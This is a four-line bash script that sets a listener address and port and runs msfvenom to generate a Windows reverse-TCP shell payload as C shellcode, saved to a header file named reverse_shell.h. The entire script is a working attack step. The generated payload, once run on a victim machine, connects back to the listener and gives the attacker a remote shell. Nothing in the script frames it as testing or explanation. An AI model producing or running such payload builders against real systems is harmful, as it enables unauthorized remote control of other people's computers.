#!/bin/bash

IPADDR="192.168.0.1"
PORT=8080

msfvenom -p windows/shell_reverse_tcp lhost=$IPADDR lport=$PORT -f c > ./reverse_shell.h